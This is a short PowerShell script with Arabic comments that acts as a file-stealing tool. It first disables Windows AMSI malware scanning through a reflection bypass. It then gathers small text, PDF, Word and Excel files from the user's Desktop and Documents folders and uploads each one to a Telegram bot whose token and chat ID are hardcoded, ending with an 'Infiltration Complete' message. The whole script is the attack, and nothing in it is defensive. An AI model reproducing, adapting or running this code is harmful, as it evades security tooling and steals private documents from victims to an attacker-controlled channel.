# --- [1] كسر الحماية (Shadow Bypass V5) ---
$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$s.GetField('amsiContext','NonPublic,Static').SetValue($null,(New-Object IntPtr(0)));

# --- [2] إعدادات البوت ---
$t = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
$c = "7393359923"

# --- [3] ميكانيكا تجميع الملفات ---
$targets = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents")
$extensions = @("*.txt", "*.pdf", "*.docx", "*.xlsx")
$foundFiles = @()

foreach ($path in $targets) {
    if (Test-Path $path) {
        foreach ($ext in $extensions) {
            # البحث عن الملفات اللي اتعدلت في آخر 30 يوم وحجمها صغير
            $foundFiles += Get-ChildItem -Path $path -Filter $ext -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 5MB }
        }
    }
}

# --- [4] إرسال الغنائم ---
foreach ($file in $foundFiles) {
    # إرسال كل ملف لوحده للبوت
    curl.exe -F "chat_id=$c" -F "document=@$($file.FullName)" "https://api.telegram.org/bot$t/sendDocument"
    Start-Sleep -Seconds 1 # استراحة بسيطة عشان التليجرام ميعملش بلوك
}

# إرسال تقرير نهائي
curl.exe -X POST "https://api.telegram.org/bot$t/sendMessage" -d "chat_id=$c&text=🎯 Module 05: Infiltration Complete. Files Sent."
